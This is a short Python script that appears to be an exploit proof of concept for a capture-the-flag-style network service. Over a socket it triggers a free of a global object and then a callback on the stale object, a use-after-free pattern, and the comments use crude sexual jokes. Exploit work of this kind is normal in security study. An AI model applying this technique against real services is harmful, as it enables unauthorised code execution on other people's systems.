import socket, sys

if len(sys.argv) != 3:
    print 'Usage: %s <ip> <command>' % sys.argv[0]
    exit(0)

s = socket.create_connection((sys.argv[1], 0xb00b))

# cold breasts -> set global info variable
s.send('( ^ )( ^ )\n')

# set global info variable's data
s.send('(*)(*)\n')
s.send('AAAA\n')

# lopsided breasts -> free global info variable
s.send('(o)(O)\n')

# pornstar breasts -> execute callback
s.send('($)($)\n')
